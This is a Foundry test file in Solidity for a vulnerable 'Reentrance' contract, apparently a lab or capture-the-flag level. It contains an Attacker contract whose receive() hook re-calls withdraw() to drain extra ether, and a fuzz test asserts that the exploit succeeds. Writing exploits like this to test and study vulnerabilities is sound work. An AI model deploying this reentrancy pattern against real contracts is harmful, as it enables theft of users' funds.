
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract TestReentrancyReentrance is Test {
    Reentrance public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrance();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max / 2);
        

        // --- 2. State Configuration (Pre-Condition) ---
        

        // --- 3. Funding ---
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrance public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackVal;

    constructor(address victimAddress) { 
        victim = Reentrance(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackVal = val;
        victim.donate{value: val * 2}(address(this));
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.withdraw(attackVal);

        if (address(this).balance == initialSnapshot + 2 * attackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.withdraw(attackVal);
        }
    }
}
